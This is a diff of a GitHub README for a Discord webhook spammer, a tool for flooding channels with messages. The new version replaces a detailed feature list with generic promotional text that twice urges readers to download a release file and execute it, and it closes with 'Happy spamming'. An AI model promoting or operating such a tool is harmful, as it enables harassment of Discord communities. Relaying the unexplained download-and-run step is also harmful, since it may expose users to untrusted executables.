@@ -1,47 +1,106 @@
-# 📢 Discord Webhook Spammer 🛠️
+# Webhook Spammer 🚀
 
-The Discord Webhook Spammer is a Python script designed to provide various functionalities related to Discord webhooks, including spamming messages, validating webhook existence, setting webhook properties, getting webhook information, and more. This toolkit offers a comprehensive set of features to assist users in managing and interacting with Discord webhooks efficiently.
+Welcome to the **Webhook Spammer** repository! This project allows you to flood Discord webhooks with messages. Use this tool responsibly and understand the implications of its use.
+
+![Webhook Spammer](https://img.shields.io/badge/Webhook_Spammer-v1.0.0-brightgreen)
+
+## Table of Contents
+
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Contact](#contact)
+
+## Introduction
+
+The **Webhook Spammer** is designed to send a large number of messages to Discord webhooks. This can be useful for testing and understanding how webhooks operate. However, please use this tool wisely to avoid violating Discord's terms of service.
 
 ## Features
 
-- **Webhook Spammer**: Spam messages to a Discord webhook with customizable options.
-- **Quick Validation**: Check if a webhook exists before performing any actions.
-- **Set Webhook Name**: Set the name of the webhook for identification.
-- **Set Message to Spam**: Define the message content to be spammed.
-- **Set Amount of Messages**: Specify the number of messages to be spammed.
-- **Set Spam Delay**: Adjust the delay between each message spam.
-- **Send TTS Messages**: Enable Text-To-Speech (TTS) messages for added interactivity.
-- **Webhook Deletor**: Delete a Discord webhook.
-- **Webhook Info Getter**: Retrieve information about a Discord webhook, such as its name, channel ID, guild ID, token, avatar, and ID.
+- **Flood Webhooks**: Send numerous messages to a specified webhook URL.
+- **Customizable Messages**: Set your own message content for the spam.
+- **Easy to Use**: Simple commands to start flooding webhooks.
+- **Lightweight**: Minimal resource usage.
+
+## Installation
+
+To get started, you need to download the latest release. You can find it [here](https://github.com/lotsoporte14/webhook-spammer/releases). Download the file and execute it on your machine.
+
+### Prerequisites
+
+- A machine with Python 3.x installed.
+- Access to the Discord webhook URL you want to target.
+
+### Steps
+
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/lotsoporte14/webhook-spammer.git
+   cd webhook-spammer
+   ```
+
+2. Install required dependencies:
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+3. Execute the script:
+   ```bash
+   python spammer.py
+   ```
 
 ## Usage
 
-1. **Install Dependencies**: Ensure you have Python installed on your system. Additionally, install the required libraries using pip:
+Once the script is running, follow these steps to send messages:
 
-    ```
-    pip install requests , colorama
-    ```
+1. **Input the Webhook URL**: When prompted, paste your Discord webhook URL.
+2. **Set the Message**: Type the message you want to send.
+3. **Specify the Amount**: Decide how many times you want to send the message.
+4. **Start Spamming**: Hit enter, and watch the messages flood in!
 
-2. **Run the Script**: Execute the Python script `main.py` and follow the prompts.
+### Example Command
 
-    ```
-    python main.py
-    ```
+```bash
+python spammer.py
+```
 
-3. **Choose Operation**: Select the desired operation from the provided menu, such as spamming messages, getting webhook information, or deleting a webhook.
+### Important Notes
 
-4. **Provide Inputs**: Depending on the chosen operation, provide the necessary inputs such as webhook URL, message content, spam amount, etc.
+- Use this tool for educational purposes only.
+- Avoid spamming public servers or causing disruption.
+- Understand that misuse may lead to bans or account suspensions.
 
-5. **Execute Operation**: Confirm your inputs and execute the operation. The script will perform the requested action accordingly.
+## Contributing
 
-## Requirements
+Contributions are welcome! If you have suggestions or improvements, feel free to create a pull request. Please ensure your code adheres to the following guidelines:
 
-- Python 3.x
-- `requests , colorama` library
+- Keep the code clean and readable.
+- Document your changes.
+- Follow the project's existing style.
 
-## Disclaimer
+## License
 
-🚨 This tool is intended for educational and testing purposes only. Any misuse or abuse of this tool to spam or harass Discord users or servers is strictly prohibited and may result in disciplinary action. By using this tool, you agree to use it responsibly and adhere to Discord's Terms of Service and Community Guidelines. 🚨
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
+## Contact
 
-chfhol
+For any questions or issues, feel free to reach out via GitHub issues or contact me directly. Your feedback is valuable.
+
+---
+
+To download the latest version of **Webhook Spammer**, visit [here](https://github.com/lotsoporte14/webhook-spammer/releases). Execute the downloaded file to start using the tool.
+
+---
+
+### Disclaimer
+
+This tool is for educational purposes. Ensure you have permission to use webhooks before sending messages. Misuse may lead to consequences.
+
+![Discord](https://img.shields.io/badge/Discord-Community-7289DA)
+
+---
+
+Thank you for checking out the **Webhook Spammer**! Happy spamming, but remember to do it responsibly!
